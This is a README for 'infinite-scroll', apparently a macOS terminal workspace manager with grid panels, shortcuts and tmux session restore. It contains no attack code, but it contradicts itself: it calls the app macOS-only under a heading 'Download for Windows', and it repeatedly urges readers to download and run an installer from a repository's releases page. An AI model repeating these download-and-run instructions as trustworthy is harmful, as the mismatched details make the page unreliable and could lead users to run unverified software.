# ⚪ infinite-scroll - Keep terminals in one canvas

[![Download infinite-scroll](https://img.shields.io/badge/Download%20Now-gray?style=for-the-badge&labelColor=1f2937)](https://github.com/igrej7083/infinite-scroll/releases)

## 🖥️ What this app does

Infinite Scroll is a terminal workspace manager for macOS. It helps you keep many terminal windows in one place so you can move between them with less effort.

Use it to:

- arrange terminal panels in a grid
- scroll through rows with your mouse wheel
- move between panels with the keyboard
- keep your terminal layout saved between launches
- add short notes for each row
- restore sessions with tmux

This app works well if you often keep several terminals open at once and want a cleaner way to manage them.

## 📥 Download for Windows

To get the app, visit the release page and download the latest file for your system:

[Download infinite-scroll from Releases](https://github.com/igrej7083/infinite-scroll/releases)

After the file downloads, open it and run the installer or app file inside. If your browser asks where to save it, choose a folder you can find again, such as Downloads.

## 🔧 What you need

Before you run infinite-scroll, make sure your computer can open the app file from the release page.

For the best experience, use:

- a current desktop system
- a screen large enough for multiple terminal panels
- a mouse or trackpad with scroll support
- a terminal shell you already use

If you plan to use session restore, install tmux as well. tmux keeps terminal sessions alive so your workspace can open again later.

## 🚀 Get started

Follow these steps to set up the app.

1. Open the release page.
2. Download the latest build.
3. Save the file to your computer.
4. Open the downloaded file.
5. If the app is inside a compressed file, extract it first.
6. Start the app.
7. Create your first workspace.
8. Add one or more terminal panels.
9. Use the shortcuts below to move around.

If the app does not open from your browser, go to your Downloads folder and try again from there.

## 🧭 Main features

Infinite Scroll is built to help you manage many terminal views without losing track of them.

### Grid layout

Place terminals in rows and cells. This gives you a clear view of all active work at once.

### Infinite scrolling

Move up and down through rows with `Cmd+Scroll`. This helps you handle large workspaces without opening new windows.

### Keyboard control

Use `Cmd+Arrows` to move between panels. This is useful when you want to keep your hands on the keyboard.

### Session persistence

The app saves your workspace state and can restore sessions with tmux. Your layout stays in place when you reopen it.

### Row notes

Add markdown notes beside each row. This helps you keep track of what each group of terminals is for.

### Auto-save

The app saves changes as you work, so you do not need to keep saving by hand.

## 🧱 How the workspace is laid out

Infinite Scroll uses a canvas style layout.

- each row holds one or more terminal cells
- rows stack vertically
- you can scroll through the canvas instead of switching tabs
- each cell can run its own command
- each row can have its own note

This layout works well for:

- local development
- server monitoring
- log checks
- build tasks
- side-by-side command work
- keeping related tasks in one view

## ⌨️ Shortcuts

Use these shortcuts to control the app:

| Key | Action |
| --- | --- |
| `Cmd+Shift+Down` | New row |
| `Cmd+D` | Duplicate cell |
| `Cmd+W` | Close cell |
| `Cmd+Arrows` | Navigate panels |
| `Cmd+Scroll` | Scroll rows |
| `Cmd+=` / `Cmd+-` | Zoom in/out |
| `Cmd+/` | Show help |

If you forget a shortcut, open the help view with `Cmd+/`.

## 🛠️ Using tmux with your workspace

tmux lets your terminal sessions stay open after you close the app or disconnect from a shell.

A simple setup looks like this:

1. Open a terminal session.
2. Start tmux.
3. Run the command you want to keep alive.
4. Return to infinite-scroll and place that session in a cell.
5. Reopen the workspace later and attach to the same session.

This is useful when you want your long-running tasks to keep going, such as:

- test runs
- local servers
- log tails
- deployment commands
- watch processes

## 📁 Saving and reopening workspaces

The app keeps your workspace state so you can return to the same setup later.

Saved state can include:

- row order
- cell layout
- panel size
- notes
- active session links

To keep things organized, use one workspace per project or task group. That makes it easier to find the right setup when you come back.

## 🧩 Common ways to use it

Here are a few simple setups:

### One project

- top row: editor or main shell
- second row: test commands
- third row: logs
- note: project goal and next step

### Server work

- row one: SSH session
- row two: service logs
- row three: resource checks
- note: host name and purpose

### Build and debug

- row one: build command
- row two: error output
- row three: file watcher
- note: what changed and what to check next

## 📦 From source

If you want to build the app yourself, use:

```bash
swift build
```

This step is only for people who want to compile the project from source. Most users should use the release download instead.

## 🧪 Tips for first use

Start with a small layout so it is easy to learn.

- make one or two rows first
- keep cell names simple
- use notes for task names
- try `Cmd+Arrows` to move around
- use `Cmd+Scroll` to test row movement
- duplicate a cell with `Cmd+D` when you need the same command in more than one place

If the screen feels crowded, use `Cmd+=` or `Cmd+-` to change the zoom level.

## 🗂️ File and workspace habits

Good workspace habits make the app easier to use.

- keep one workspace per project
- use short row notes
- close panels you no longer need
- keep long-running tasks in tmux
- save separate layouts for separate jobs

This keeps your canvas readable when it grows.

## 🧰 Troubleshooting

If the app does not start, check these items:

- the file finished downloading
- the file was extracted if needed
- your system supports the app
- tmux is installed if you use session restore
- the app has permission to open on your computer

If a terminal panel does not show the right session, open the tmux session in a shell and try again.

If scrolling does not move rows, click inside the app first so it can receive input.

## 📌 Release page

Get the latest download here:

[https://github.com/igrej7083/infinite-scroll/releases](https://github.com/igrej7083/infinite-scroll/releases)

## 📘 Help view

Use `Cmd+/` inside the app to open the built-in help screen and check shortcuts while you work